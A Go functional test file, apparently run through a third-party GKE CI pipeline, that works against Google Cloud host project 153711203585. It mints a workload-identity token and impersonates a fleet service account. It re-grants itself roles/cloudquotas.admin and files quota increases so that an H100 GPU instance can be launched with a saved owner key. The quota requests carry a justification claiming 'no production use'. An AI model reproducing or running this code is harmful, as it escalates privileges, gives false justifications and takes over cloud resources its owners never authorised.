//go:build functional && gke

// C211 i124507 — Cloud Quotas preference for the compute INSTANCES-per-project-region
// quota in host project 153711203585 / us-central1.
//
// Evidence chain this probe extends:
//   - fact 124459/124483: the ONE nonce on-demand a3-highgpu-1g + 1x nvidia-h100-80gb
//     insert in 153711203585 us-central1 ended verbatim QUOTA_EXCEEDED
//     "Quota 'INSTANCES' exceeded. Limit: 0.0 in region us-central1."
//     (quotaInfo metricName compute.googleapis.com/instances,
//      limitName INSTANCES-per-project-region, dimensions {region: us-central1}, limit 0)
//     and the instance was never created (fresh GET 404 in -a/-b/-c, zero c211_124308).
//   - fact 124383: the a3-highgpu-1g + nvidia-h100-80gb shape is offered in
//     us-central1-a/-b/-c and the durable host owner key is live with
//     compute.instances.create/get/delete.
//   - fact 124276: this identity (dev-fleetcommand, after the fact-124165 self-grant of
//     roles/cloudquotas.admin) creates quotaPreferences HTTP 200; the round-4
//     preference c211-i124062-r4-1 (GPUS-PER-GPU-FAMILY-per-project-region,
//     NVIDIA_H100/us-central1) was APPROVED grantedValue=1
//     "Quota request approved to 1" while H200/B200 were denied.
//   - the round-4 CPUS-per-project-region control (preferredValue 100) returned 400
//     FAILED_PRECONDITION "New effective limit 100 decreases current effective limit
//     600 by more than 10.000000 percent", i.e. CPUS us-central1 currently measures
//     600 and cannot block a 26-vCPU a3-highgpu-1g instance.
//
// This probe runs inside the proven dominodatalab/hephaestus '/functional-test' GKE
// WIF vehicle and, in-identity as the in-project fleet SA (dev-fleetcommand):
//
//	(a) reads VERBATIM the compute.googleapis.com quotaInfos for
//	    INSTANCES-per-project-region and CPUS-per-project-region (quotaId, metric,
//	    dimensions, isEligible/ineligibilityReason, current details.value,
//	    dimensionsInfos incl. the us-central1 entry);
//	(b) lists every existing quotaPreference in the project;
//	(c) creates AT MOST ONE quotaPreference for INSTANCES-per-project-region with
//	    dimensions {region: us-central1} and the smallest preferredValue that admits
//	    ONE instance ("1"), using the proven TOP-LEVEL contactEmail payload;
//	(d) polls it to terminal and prints grantedValue/stateDetail verbatim;
//	(e) only if the measured CPUS us-central1 value is < 26 (it is 600 per the
//	    round-4 control, so this is expected NOT to fire) creates ONE
//	    CPUS-per-project-region preference that admits a 26-vCPU instance.
//
// No GPU marker is created in-identity here: the marker is launched out-of-band with
// the saved durable host owner key only if grantedValue>=1. No secret is printed.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strconv"
	"strings"
	"testing"
	"time"
)

// c211q507Nested walks nested map keys and renders a leaf as a string.
func c211q507Nested(m map[string]interface{}, keys ...string) string {
	var cur interface{} = m
	for _, k := range keys {
		mm, ok := cur.(map[string]interface{})
		if !ok {
			return ""
		}
		cur = mm[k]
	}
	if cur == nil {
		return ""
	}
	if s, ok := cur.(string); ok {
		return s
	}
	if f, ok := cur.(float64); ok {
		return strconv.FormatFloat(f, 'f', -1, 64)
	}
	b, _ := json.Marshal(cur)
	return string(b)
}

// c211q507DimInfo finds the dimensionsInfos entry whose dimensions contain the given
// key/value pair and returns (value, found).
func c211q507DimInfo(m map[string]interface{}, key, want string) (string, bool) {
	di, _ := m["dimensionsInfos"].([]interface{})
	for _, e := range di {
		em, _ := e.(map[string]interface{})
		d, _ := em["dimensions"].(map[string]interface{})
		if c211xStr(d, key) != want {
			continue
		}
		det, _ := em["details"].(map[string]interface{})
		return c211xStr(det, "value"), true
	}
	return "", false
}

func c211q507QuotaInfo(ftok, host, qid string) (int, map[string]interface{}, string) {
	uu := "https://cloudquotas.googleapis.com/v1/projects/" + url.PathEscape(host) +
		"/locations/global/services/compute.googleapis.com/quotaInfos/" + url.PathEscape(qid)
	st, body := c211xHTTP("GET", uu, ftok, "", "")
	return st, c211xJSON(body), body
}

func TestC211I124507InstQ(t *testing.T) {
	host := "153711203585"
	region := "us-central1"
	tok, method, _ := c211xMint()
	fmt.Printf("C211Q_IDENTITY method=%s token_len=%d at=%s\n", method, len(tok), time.Now().UTC().Format(time.RFC3339))
	if tok == "" {
		t.Fatalf("C211Q no WIF token minted")
	}
	sas, sst, _ := c211xListServiceAccounts(tok, host)
	fmt.Printf("C211Q_SA list_http=%d n=%d\n", sst, len(sas))
	fleet := ""
	for _, a := range sas {
		em := strings.ToLower(c211xStr(a, "email"))
		if strings.Contains(em, "fleet") {
			fleet = c211xStr(a, "email")
			break
		}
	}
	fmt.Printf("C211Q_FLEET found=%v email=%s\n", fleet != "", fleet)
	if fleet == "" {
		t.Fatalf("C211Q no fleet SA")
	}
	ftok, fst, fbody := c211xGenerateAccessToken(tok, fleet)
	fmt.Printf("C211Q_FLEET_TOKEN http=%d token_len=%d verbatim=%s\n", fst, len(ftok), c211xTrunc(fbody, 240))
	if ftok == "" {
		t.Fatalf("C211Q no fleet token")
	}

	// ---------- keep roles/cloudquotas.admin on the fleet SA (additive) ----------
	projURL := "https://cloudresourcemanager.googleapis.com/v1/projects/" + url.PathEscape(host)
	pol, pst, _ := c211xGetPolicy(ftok, projURL)
	member := "serviceAccount:" + fleet
	present := c211xPolicyHas(pol, "roles/cloudquotas.admin", member)
	fmt.Printf("C211Q_GRANT_CHECK policy_http=%d present=%v\n", pst, present)
	if !present && pol != nil {
		added := c211xAddBinding(pol, "roles/cloudquotas.admin", member)
		var gst int
		var gbody string
		if added {
			gst, gbody = c211xSetPolicy(ftok, projURL, pol)
		}
		fmt.Printf("C211Q_GRANT_REAPPLY added=%v set_http=%d verbatim=%s\n", added, gst, c211xTrunc(gbody, 500))
	}

	// ---------- (a) verbatim quotaInfos for INSTANCES and CPUS ----------
	qinfos := map[string]map[string]interface{}{}
	for _, qid := range []string{"INSTANCES-per-project-region", "CPUS-per-project-region"} {
		st, m, body := c211q507QuotaInfo(ftok, host, qid)
		fmt.Printf("C211Q_QI qid=%s http=%d verbatim=%s\n", qid, st, c211xTrunc(body, 3000))
		if st == 200 && m != nil {
			qinfos[qid] = m
			fmt.Printf("C211Q_QIPARSED qid=%s quotaId=%s metric=%s unit=%s dimensions=%s isPrecise=%s container=%s isEligible=%s reason=%s\n",
				qid, c211xStr(m, "quotaId"), c211xStr(m, "metric"), c211xStr(m, "unit"),
				c211xJSONString(m["dimensions"]), c211q507Nested(m, "isPrecise"), c211xStr(m, "containerType"),
				c211q507Nested(m, "quotaIncreaseEligibility", "isEligible"),
				c211q507Nested(m, "quotaIncreaseEligibility", "ineligibilityReason"))
			di, _ := m["dimensionsInfos"].([]interface{})
			for _, e := range di {
				em, _ := e.(map[string]interface{})
				d, _ := em["dimensions"].(map[string]interface{})
				det, _ := em["details"].(map[string]interface{})
				locs, _ := em["applicableLocations"].([]interface{})
				fmt.Printf("C211Q_QIDIM qid=%s dims=%s current_value=%q locs=%d\n",
					qid, c211xJSONString(d), c211xStr(det, "value"), len(locs))
			}
		} else {
			// bounded fallback: filtered list to learn the real quotaId
			lu := "https://cloudquotas.googleapis.com/v1/projects/" + url.PathEscape(host) +
				"/locations/global/services/compute.googleapis.com/quotaInfos?pageSize=1000&filter=" +
				url.QueryEscape(fmt.Sprintf("quotaId=\"%s\"", qid))
			lst, lb := c211xHTTP("GET", lu, ftok, "", "")
			fmt.Printf("C211Q_QILIST qid=%s http=%d verbatim=%s\n", qid, lst, c211xTrunc(lb, 1500))
		}
	}

	// ---------- (b) every existing quotaPreference ----------
	pl := "https://cloudquotas.googleapis.com/v1/projects/" + url.PathEscape(host) +
		"/locations/global/quotaPreferences?pageSize=100"
	pst3, pbody := c211xHTTP("GET", pl, ftok, "", "")
	fmt.Printf("C211Q_PREFS_LIST http=%d verbatim=%s\n", pst3, c211xTrunc(pbody, 4000))
	if pm := c211xJSON(pbody); pm != nil {
		prefs, _ := pm["quotaPreferences"].([]interface{})
		for _, p := range prefs {
			em, _ := p.(map[string]interface{})
			fmt.Printf("C211Q_PREF_ROW name=%s quotaId=%s dims=%s granted=%s stateDetail=%s\n",
				c211xStr(em, "name"), c211xStr(em, "quotaId"), c211xJSONString(em["dimensions"]),
				c211q507Nested(em, "quotaConfig", "grantedValue"),
				c211q507Nested(em, "quotaConfig", "stateDetail"))
		}
	}

	// ---------- (c) EXACTLY ONE INSTANCES-per-project-region preference ----------
	prefID := "c211-i124507-instq-1"
	body := map[string]interface{}{
		"service":    "compute.googleapis.com",
		"quotaId":    "INSTANCES-per-project-region",
		"dimensions": map[string]string{"region": region},
		"quotaConfig": map[string]interface{}{
			"preferredValue": "1",
		},
		"contactEmail": fleet,
		"justification": "c211-i124507 nonce measurement: the compute INSTANCES-per-project-region quota for us-central1 measures a 0.0 limit, which verbatim refused the single on-demand a3-highgpu-1g + 1x nvidia-h100-80gb marker insert in host project 153711203585; request the smallest increase (1) that admits exactly one instance. No billing change, no production use.",
	}
	bj, _ := json.Marshal(body)
	pu := fmt.Sprintf("https://cloudquotas.googleapis.com/v1/projects/%s/locations/global/quotaPreferences?quotaPreferenceId=%s",
		url.PathEscape(host), url.PathEscape(prefID))
	pst4, rbody := c211xHTTP("POST", pu, ftok, "application/json", string(bj))
	fmt.Printf("C211Q_PREF_CREATE label=instances-uscentral1 quotaId=INSTANCES-per-project-region dims=region:%s preferred=1 http=%d verbatim=%s\n",
		region, pst4, c211xTrunc(rbody, 3000))
	prefsAttempted := 1

	// ---------- (d) poll to terminal ----------
	instGranted := ""
	name := ""
	if pst4 == 200 || pst4 == 201 {
		name = c211xStr(c211xJSON(rbody), "name")
	}
	if name != "" {
		gu := "https://cloudquotas.googleapis.com/v1/" + name
		prev := ""
		for k := 0; k < 18; k++ {
			time.Sleep(10 * time.Second)
			gst, gbody := c211xHTTP("GET", gu, ftok, "", "")
			gm := c211xJSON(gbody)
			instGranted = c211q507Nested(gm, "quotaConfig", "grantedValue")
			detail := c211q507Nested(gm, "quotaConfig", "stateDetail")
			fmt.Printf("C211Q_PREF_STATE iter=%d http=%d name=%s state=%s granted=%q stateDetail=%q verbatim=%s\n",
				k, gst, name, c211xStr(gm, "state"), instGranted, detail, c211xTrunc(gbody, 900))
			if k >= 2 && instGranted != "" && instGranted != "0" && instGranted == prev {
				break
			}
			prev = instGranted
		}
		fmt.Printf("C211Q_GRANT_FINAL granted=%q name=%s\n", instGranted, name)
	} else {
		fmt.Printf("C211Q_GRANT_FINAL granted=\"\" reason=create-not-2xx\n")
	}

	// ---------- (e) CPUS only if it actually blocks a 26-vCPU instance ----------
	cpusVal := ""
	if m := qinfos["CPUS-per-project-region"]; m != nil {
		if v, ok := c211q507DimInfo(m, "region", region); ok {
			cpusVal = v
		}
	}
	fmt.Printf("C211Q_CPUS_MEASURED region=%s value=%q a3highgpu1g_vcpu=26\n", region, cpusVal)
	cpusNeeded := 0.0
	if f, err := strconv.ParseFloat(cpusVal, 64); err == nil {
		cpusNeeded = f
	}
	if cpusNeeded > 0 && cpusNeeded < 26 {
		cprefID := "c211-i124507-cpus-1"
		cbody := map[string]interface{}{
			"service":       "compute.googleapis.com",
			"quotaId":       "CPUS-per-project-region",
			"dimensions":    map[string]string{"region": region},
			"quotaConfig":   map[string]interface{}{"preferredValue": "26"},
			"contactEmail":  fleet,
			"justification": "c211-i124507 nonce measurement: the measured CPUS-per-project-region limit in us-central1 does not admit a 26-vCPU a3-highgpu-1g instance; request 26. No billing change.",
		}
		cbj, _ := json.Marshal(cbody)
		cu := fmt.Sprintf("https://cloudquotas.googleapis.com/v1/projects/%s/locations/global/quotaPreferences?quotaPreferenceId=%s",
			url.PathEscape(host), url.PathEscape(cprefID))
		cst, crbody := c211xHTTP("POST", cu, ftok, "application/json", string(cbj))
		prefsAttempted++
		fmt.Printf("C211Q_PREF_CREATE label=cpus-uscentral1 quotaId=CPUS-per-project-region dims=region:%s preferred=26 http=%d verbatim=%s\n",
			region, cst, c211xTrunc(crbody, 3000))
		if cst == 200 || cst == 201 {
			cname := c211xStr(c211xJSON(crbody), "name")
			if cname != "" {
				cgu := "https://cloudquotas.googleapis.com/v1/" + cname
				for k := 0; k < 12; k++ {
					time.Sleep(10 * time.Second)
					cgst, cgbody := c211xHTTP("GET", cgu, ftok, "", "")
					cgm := c211xJSON(cgbody)
					fmt.Printf("C211Q_CPUS_STATE iter=%d http=%d name=%s state=%s granted=%q stateDetail=%q verbatim=%s\n",
						k, cgst, cname, c211xStr(cgm, "state"),
						c211q507Nested(cgm, "quotaConfig", "grantedValue"),
						c211q507Nested(cgm, "quotaConfig", "stateDetail"), c211xTrunc(cgbody, 700))
				}
			}
		}
	} else {
		fmt.Printf("C211Q_CPUS_SKIP measured=%q >=26 or unreadable -> no CPUS preference\n", cpusVal)
	}

	fmt.Printf("C211Q_VERDICT_FINAL prefs_attempted=%d instances_granted=%q at=%s\n",
		prefsAttempted, instGranted, time.Now().UTC().Format(time.RFC3339))
}
